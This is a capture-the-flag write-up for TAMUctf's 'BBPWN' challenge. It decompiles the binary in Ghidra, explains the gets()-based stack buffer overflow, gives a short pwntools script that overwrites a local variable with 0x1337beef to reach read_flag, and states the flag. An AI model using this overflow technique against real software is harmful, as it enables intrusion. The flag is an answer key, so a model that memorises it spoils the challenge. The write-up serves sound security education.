# BBPWN

## Description

> Welcome to pwnland!
> 
> `nc challenges.tamuctf.com 4252`

The corresponding binary is given.

## Solution

Let's reverse the code using [Ghidra](https://ghidra-sre.org/).

```c

/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */

undefined4 main(void)

{
  undefined4 uVar1;
  int in_GS_OFFSET;
  char local_38 [32];
  int local_18;
  int local_14;
  undefined *local_10;
  
  local_10 = &stack0x00000004;
  local_14 = *(int *)(in_GS_OFFSET + 0x14);
  local_18 = 0;
  printf("Enter a string: ");
  fflush(stdout);
  gets(local_38);
  if (local_18 == 0x1337beef) {
    read_flag();
  }
  else {
    printf("\nThe string \"%s\" is lame.\n",local_38);
    fflush(stdout);
  }
  uVar1 = 0;
  if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
    uVar1 = __stack_chk_fail_local();
  }
  return uVar1;
}
```

The `gets` function is dangerous and should not be used, it does not perform any check on the input length. We can therefore use a buffer overflow attack to overflow `local38` and write the correct value `0x1337beef` in `local_18`.

The payload is therefore 32 characters to fill `local38`, then `0x1337beef` (written in little endian `\xef\xbe\x37\x13`) to fill `local_18`.

This simple script does the job:

```python
from pwn import *

sh = remote('challenges.tamuctf.com', 4252)
print(sh.recvuntil("Enter a string:"))
sh.sendline(b'a'*32 + b'\xef\xbe\x37\x13')
sh.interactive()
```

Flag: `gigem{0per4tion_skuld_74757474757275}`